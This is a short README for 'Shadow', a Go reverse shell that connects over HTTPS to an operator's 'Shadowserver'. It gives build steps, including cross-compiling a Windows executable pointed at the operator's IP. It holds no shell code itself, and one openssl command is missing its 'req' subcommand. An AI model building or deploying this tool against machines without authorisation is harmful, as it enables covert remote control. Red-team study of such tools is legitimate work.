# Shadow - A platform independent reverse shell over https.

#####  Shadow is a reverse shell over https and Shadowserver is a manager for Shadow .

## Getting Started

##### git clone https://github.com/diljithishere/shadow.git
##### cd shadow/src
#### Create certs
#### openssl genrsa -out server.key 2048
#### openssl -new -x509 -days 1826 -key server.key -out server.crt
#### Build Shadow 
#### Update your shadowserver ip  {shadowserver := "https://ip:port"}
##### GOOS=windows GOARCH=386 go build -o shadow.exe shadow.go

#### Build Shadow Server
##### go build -o shadowserver shadowserver.go 
#### Run Shadow Server 
##### ./shadowserver

#### Once if the shadow runs Shadowserver's prompt will change to <<Talk to Shadow>>


### Prerequisites

#### Go 1.9

## Built With
#### Go Lang

## Author

* **Diljith S** - *Initial work* - (https://github.com/diljithishere)
